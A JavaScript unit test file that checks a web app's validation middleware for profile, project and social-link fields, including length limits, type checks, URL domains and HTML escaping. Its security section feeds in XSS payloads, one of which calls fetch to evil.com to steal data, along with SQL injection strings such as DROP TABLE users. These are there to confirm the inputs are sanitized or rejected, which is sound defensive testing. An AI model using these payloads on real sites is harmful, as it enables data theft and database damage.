import { describe, it, expect, beforeEach, vi } from 'vitest';
import { validateProfileData, validateProjectData, validateProfileLinks } from '../../src/middleware/validation.middleware.js';

describe('Validation Middleware Unit Tests', () => {
  let mockReq, mockReply;
  
  beforeEach(() => {
    mockReq = { body: {} };
    mockReply = {
      status: vi.fn().mockReturnThis(),
      send: vi.fn().mockReturnThis()
    };
  });
  
  describe('validateProfileData', () => {
    it('should pass valid profile data without modification', async () => {
      mockReq.body = {
        first_name: 'John',
        last_name: 'Doe',
        username: 'johndoe123',
        bio: 'A simple bio',
        expertise: 'JavaScript Developer',
        website: 'https://johndoe.com'
      };
      
      const result = await validateProfileData(mockReq, mockReply);
      
      expect(result).toBeUndefined(); // No return means validation passed
      expect(mockReply.status).not.toHaveBeenCalled();
      expect(mockReply.send).not.toHaveBeenCalled();
      expect(mockReq.body.first_name).toBe('John');
      expect(mockReq.body.bio).toBe('A simple bio');
    });
    
    it('should sanitize HTML/XSS in bio field', async () => {
      mockReq.body = {
        bio: '<script>alert("xss")</script>Safe content'
      };
      
      const result = await validateProfileData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.bio).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;Safe content');
      expect(mockReply.status).not.toHaveBeenCalled();
    });
    
    it('should reject bio that is too long', () => {
      mockReq.body = {
        bio: 'x'.repeat(1001) // 1001 characters, limit is 1000
      };
      
      validateProfileData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Bio must be less than 1000 characters",
        errorCode: "bio-too-long",
        errorKey: 400102
      });
    });
    
    it('should reject invalid username characters', () => {
      mockReq.body = {
        username: 'invalid@username!' // Contains invalid characters
      };
      
      validateProfileData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Username can only contain letters, numbers, underscores, and dashes",
        errorCode: "username-invalid-characters",
        errorKey: 400105
      });
    });
    
    it('should accept valid username with allowed characters', async () => {
      mockReq.body = {
        username: 'valid_user-123'
      };
      
      const result = await validateProfileData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.username).toBe('valid_user-123');
    });
    
    it('should reject invalid website URL', () => {
      mockReq.body = {
        website: 'not-a-url'
      };
      
      validateProfileData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Website must be a valid URL (http:// or https://)",
        errorCode: "website-invalid-url",
        errorKey: 400106
      });
    });
    
    it('should accept valid website URL', async () => {
      mockReq.body = {
        website: 'https://example.com'
      };
      
      const result = await validateProfileData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.website).toBe('https://example.com');
    });
    
    it('should reject non-string field types', () => {
      mockReq.body = {
        first_name: 123 // Should be string
      };
      
      validateProfileData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "First name must be a string",
        errorCode: "first_name-invalid-type",
        errorKey: 400103
      });
    });
    
    it('should handle empty/undefined fields gracefully', async () => {
      mockReq.body = {
        first_name: 'John',
        bio: undefined,
        website: ''
      };
      
      const result = await validateProfileData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.first_name).toBe('John');
    });
  });
  
  describe('validateProjectData', () => {
    it('should pass valid project data', async () => {
      mockReq.body = {
        title: 'Test Project',
        description: 'A test project description',
        category: 'Web Development',
        client: 'Test Client',
        testimonial: 'Great work!'
      };
      
      const result = await validateProjectData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.title).toBe('Test Project');
    });
    
    it('should sanitize HTML/XSS in project fields', async () => {
      mockReq.body = {
        title: '<img src="x" onerror="alert(1)">Project Title',
        description: '<script>alert("xss")</script>Description'
      };
      
      const result = await validateProjectData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.title).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;Project Title');
      expect(mockReq.body.description).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;Description');
    });
    
    it('should reject title that is too long', () => {
      mockReq.body = {
        title: 'x'.repeat(101) // 101 characters, limit is 100
      };
      
      validateProjectData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Project title must be less than 100 characters",
        errorCode: "title-too-long",
        errorKey: 400202
      });
    });
    
    it('should reject description that is too long', () => {
      mockReq.body = {
        description: 'x'.repeat(2001) // 2001 characters, limit is 2000
      };
      
      validateProjectData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Description must be less than 2000 characters",
        errorCode: "description-too-long",
        errorKey: 400204
      });
    });
    
    it('should reject non-string project fields', () => {
      mockReq.body = {
        title: ['not', 'a', 'string']
      };
      
      validateProjectData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Project title is required and must be a non-empty string",
        errorCode: "title-required",
        errorKey: 400201
      });
    });
  });
  
  describe('validateProfileLinks', () => {
    it('should pass valid social media URLs', async () => {
      mockReq.body = {
        linkedin: 'https://linkedin.com/in/johndoe',
        github: 'https://github.com/johndoe',
        twitter: 'https://twitter.com/johndoe',
        website: 'https://johndoe.com'
      };
      
      const result = await validateProfileLinks(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReply.status).not.toHaveBeenCalled();
    });
    
    it('should reject invalid URLs', () => {
      mockReq.body = {
        github: 'not-a-url'
      };
      
      validateProfileLinks(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "github must be a valid URL (http:// or https://)",
        errorCode: "github-invalid-url",
        errorKey: 400302
      });
    });
    
    it('should validate LinkedIn domain', () => {
      mockReq.body = {
        linkedin: 'https://facebook.com/johndoe' // Wrong domain
      };
      
      validateProfileLinks(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "LinkedIn URL must be from linkedin.com domain",
        errorCode: "linkedin-invalid-domain",
        errorKey: 400303
      });
    });
    
    it('should validate GitHub domain', () => {
      mockReq.body = {
        github: 'https://gitlab.com/johndoe' // Wrong domain
      };
      
      validateProfileLinks(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "GitHub URL must be from github.com domain",
        errorCode: "github-invalid-domain",
        errorKey: 400304
      });
    });
    
    it('should accept correct LinkedIn and GitHub domains', async () => {
      mockReq.body = {
        linkedin: 'https://www.linkedin.com/in/johndoe',
        github: 'https://github.com/johndoe'
      };
      
      const result = await validateProfileLinks(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReply.status).not.toHaveBeenCalled();
    });
    
    it('should handle empty URLs gracefully', async () => {
      mockReq.body = {
        linkedin: '',
        github: '   ', // Whitespace only
        twitter: undefined
      };
      
      const result = await validateProfileLinks(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReply.status).not.toHaveBeenCalled();
    });
    
    it('should reject non-string URL fields', () => {
      mockReq.body = {
        twitter: 123
      };
      
      validateProfileLinks(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "twitter must be a string",
        errorCode: "twitter-invalid-type",
        errorKey: 400301
      });
    });
  });
  
  describe('Edge Cases and Security Tests', () => {
    it('should handle malicious script injection attempts', async () => {
      mockReq.body = {
        bio: '</script><script>fetch("http://evil.com/steal-data")</script>',
        first_name: 'javascript:alert(1)',
        expertise: '<iframe src="javascript:alert(1)"></iframe>'
      };
      
      const result = await validateProfileData(mockReq, mockReply);
      
      expect(result).toBeUndefined();
      expect(mockReq.body.bio).not.toContain('<script>');
      expect(mockReq.body.bio).not.toContain('</script>');
      expect(mockReq.body.first_name).not.toContain('javascript:');
      expect(mockReq.body.expertise).not.toContain('<iframe');
    });
    
    it('should handle SQL injection attempts in text fields', () => {
      mockReq.body = {
        username: "admin'--",
        bio: "'; DROP TABLE users; --",
        first_name: "1' OR '1'='1"
      };
      
      // Username should fail validation due to special characters
      validateProfileData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Username can only contain letters, numbers, underscores, and dashes",
        errorCode: "username-invalid-characters",
        errorKey: 400105
      });
    });
    
    it('should handle very long inputs without crashing', () => {
      const veryLongString = 'x'.repeat(10000);
      mockReq.body = {
        bio: veryLongString
      };
      
      validateProfileData(mockReq, mockReply);
      
      expect(mockReply.status).toHaveBeenCalledWith(400);
      expect(mockReply.send).toHaveBeenCalledWith({
        success: false,
        message: "Bio must be less than 1000 characters",
        errorCode: "bio-too-long",
        errorKey: 400102
      });
    });
  });
});